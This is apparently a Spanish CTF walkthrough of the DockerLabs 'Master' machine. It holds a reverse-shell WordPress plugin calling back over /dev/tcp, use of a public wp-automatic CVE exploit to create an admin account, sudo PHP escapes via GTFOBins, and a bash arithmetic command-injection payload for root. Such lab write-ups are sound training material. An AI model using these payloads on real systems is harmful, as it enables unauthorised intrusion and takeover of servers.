# Maquina Master

Lo primero que deberemos de hacer será escanear los posibles puertos que se encuentre abiertos en la máquina:

```shell 
nmap -p- --open -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```
![NMAP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto.png)

Vemos que únicamente tiene abierto un puerto, el 80, por lo que vamos a ver que hay en la página web:

![HOME](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto2.png)

No hay mucha cosa interesante, en el código fuente tampoco encontramos nada, sin embargo, podemos observar en la parte de abajo que nos dice que está utilizando wp-automatic 3.92.0, tendremos esto en cuenta ya que nos servirá en un futuro. Al no encontrar nada relevante realizaremos fuzzing web con gobuster:

```shell 
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![GOBUSTER](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto3.png)

Vemos que cuenta con un wordpress (lo podíamos deducir por el wp-automatic de antes también). Si nos poníamos encima de alguno de los diferentes cursos que había veíamos que había un usuario “Mario”, por lo que lo normal sería intentar obtener su contraseña y entrar al panel de administración de Wordpress, os adelanto que no es la solución ya que lo intente y no conseguí obtener su contraseña.

Ahora es cuando entra en juego el wp-automatic de antes, si buscamos información acerca de esta versión en google acompañado de la palabra exploit vemos esto:

![WEB](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto4.png)

https://thehackernews.com/2024/04/hackers-exploiting-wp-automatic-plugin.html

Si accedemos a la web vemos que aparece un CVE que puede que podamos utilizar:

![WEB2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto5.png)

Si buscamos el CVE en Google vemos que hay un exploit en github, así que vamos a probar si funciona:

https://github.com/diego-tella/CVE-2024-27956-RCE

Si seguimos los pasos que nos indica vemos que tras ejecutar el exploit nos crea un usuario con nombre “eviladmin” y con contraseña “admin”:

![CVE](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto6.png)

Intentamos acceder con el usuario que nos ha creado el exploit y ole, ya estamos dentro del panel de administración. Ahora vamos a intentar subir una reverse shell en forma de plugin:

![WP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto7.png)

![WP2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto8.png)

Una vez aquí vemos que unicamente nos deja subir archivos con extensión .zip, por lo que vamos a investigar como poder subir una reverse shell en .zip a un wordpress:

![WEB3](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto9.png)

https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

Dentro de la página copiamos el contenido que nos pone y lo metemos en un fichero con nombre reverse.php (puedes poner el que quieras).

```shell
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>
```

![ZIP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto10.png)

Una vez tenemos el archivo en .zip vamos a intentar subirlo a ver que ocurre:

![PLUGIN](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto11.png)

Vemos que se ha subido correctamente y que nos da la opción de activarlo, antes de activarlo debemos de ponernos en escucha por el puerto que hayamos configurado para poder recibir la reverse shell:

![PLUGIN](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto12.png)

Ya estamos dentro de la máquina, por lo que primero que debermeos de hacer será realizar un tratamiento de la tty:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

Si ejecutamos el comando sudo -l vemos que podemos ejecutar php como el usuario pylon, por lo que vamos a buscar como hacerlo en GTFOBins:

https://gtfobins.github.io/gtfobins/php/#sudo

```shell
sudo -u pylon php -r "system('/bin/bash');"
```

Una vez lo ejecutamos nos convertimos en el usuario pylon, ahora repetimos el proceso y vemos que podemos ejecutar un script como el usuario “mario”. Este script nos pide introducir un parámetro, por lo que podemos intentar introducir un /bin/bash para ver si obtenemos la bash como el usuario mario:

```shell
a[$(/bin/bash >&2)]
```
![EP](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto13.png)

Y ahí esta, somos el usuario mario. Ahora si ejecutamos de nuevo sudo -l vemos que podemos ejecutar otro script como root, ese script también nos pide un parámetro por lo que vamos a intentar reutilizar lo mismo que hemos hecho antes para obtener la escalada:

![EP2](https://github.com/Isma-yo/Write-Ups-DockerLabs/blob/main/Maquina%20Master/photos/foto14.png)

